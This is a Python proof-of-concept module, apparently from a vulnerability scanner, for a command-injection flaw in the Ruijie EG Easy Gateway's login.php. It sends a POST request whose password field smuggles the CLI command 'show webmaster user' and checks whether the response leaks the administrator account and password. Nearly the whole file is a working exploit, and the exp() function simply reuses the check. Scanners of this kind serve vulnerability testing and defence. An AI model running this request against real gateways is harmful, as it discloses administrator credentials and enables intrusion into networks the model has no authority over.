import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ruijie EG Easy Gateway Password Leak''',
        "description": '''Ruijie EG Easy Gateway login.php has CLI command injection, which leads to the disclosure of administrator account and password vulnerability''',
        "severity": "high",
        "references": [
            "http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7EG%E6%98%93%E7%BD%91%E5%85%B3%20%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html", 
            "https://www.ruijienetworks.com"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["ruijie", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/login.php"""
        method = "POST"
        data = """username=admin&password=admin?show+webmaster+user"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""data":""" in resp0.text and """status":1""" in resp0.text and """admin""" in resp0.text) and ("""text/json""" in str(resp0.headers)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url